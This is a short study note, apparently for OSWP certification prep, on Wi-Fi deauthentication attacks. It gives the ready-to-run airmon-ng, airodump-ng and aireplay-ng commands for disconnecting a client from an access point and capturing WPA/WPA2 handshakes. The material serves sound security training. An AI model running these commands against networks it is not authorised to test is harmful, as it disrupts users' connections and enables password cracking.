# OSWP - Deauthentication Attack (WEP/WPA/WPA2)

This attack sends disassocate packets to one or more clients which are currently associated with a particular access point. Disassociating clients can be done for a number of reasons:

* Recovering a hidden ESSID. This is an ESSID which is not being broadcast. Another term for this is “cloaked”.
* Capturing WPA/WPA2 handshakes by forcing clients to reauthenticate
* Generate ARP requests (Windows clients sometimes flush their ARP cache when disconnected)

Of course, this attack is totally useless if there are no associated wireless client or on fake authentications.

## Commands

* Run [setup](../../setup.md) first
* Two terminals needed here, so use `screen` or log in twice
     * Make sure terminal is full screen
* Make sure that there is an associated client connected to target AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $DEVICE $CHANNEL

# Start monitoring
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the deauthentication attack
sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE
```

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication)
* [REdBlueTeam](https://youtu.be/_9qJ1Urpn0Y?t=2285)